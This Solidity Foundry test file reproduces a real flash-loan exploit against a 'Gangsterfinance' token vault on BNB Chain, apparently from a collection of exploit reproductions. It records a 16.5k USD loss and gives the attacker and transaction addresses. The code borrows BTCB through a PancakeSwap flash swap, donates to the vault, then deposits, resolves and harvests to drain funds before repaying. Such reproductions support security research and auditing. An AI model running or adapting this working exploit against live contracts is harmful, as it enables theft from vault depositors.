// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 16.5k USD
// Attacker : https://bscscan.com/address/0xc49f2938327aa2cdc3f2f89ed17b54b3671f05de
// Attack Contract : https://bscscan.com/address/0x982769c5e5dd77f8308e3cd6eec37da9d8237dc6
// Vulnerable Contract : https://bscscan.com/address/0xe968d2e4adc89609773571301abec3399d163c3b
// Attack Tx : https://bscscan.com/tx/0xf34e59e4fe2c9b454d2b73a1a3f3aaf07d484a0c71ff8278b1c068cdedc4b64d

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xe968d2e4adc89609773571301abec3399d163c3b#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : N/A
// Hacking God : N/A
pragma solidity ^0.8.0;

contract Gangsterfinance is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 51782713 - 1;
    uint256 borrowAmount = 1020000000000000000;
    
    // Relevant contracts 
    address constant BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address constant CAKE_LP = 0x0b32Ea94DA1F6679b11686eAD47AA4C6bF38cd59;
    address constant TOKEN_VAULT = 0xe968D2E4ADc89609773571301aBeC3399D163c3b;


    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(BTCB);
    }

    function testExploit() public balanceLog {
        IUniswapV2Pair(CAKE_LP).swap(borrowAmount, 0, address(this), new bytes(1));
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        
        uint256 donateAmount = 1000000000000000000;
        uint256 depositAmount = 15720000000000000; 
        uint256 repayAmount = 1022652000000000000;

        IERC20(BTCB).approve(address(TOKEN_VAULT), borrowAmount);

        ITokenVault(TOKEN_VAULT).donate(donateAmount);
        ITokenVault(TOKEN_VAULT).depositTo(address(this), depositAmount);
        ITokenVault(TOKEN_VAULT).resolve(ITokenVault(TOKEN_VAULT).myTokens());
        ITokenVault(TOKEN_VAULT).harvest();
        IERC20(BTCB).transfer(address(CAKE_LP), repayAmount);
    }
}

interface ITokenVault {
    
    function donate(uint256 _amount) external;
    function depositTo(address _user, uint256 _amount) external;
    function resolve(uint256 _amount) external;
    function harvest() external;
    function myTokens() external view returns (uint256);
}

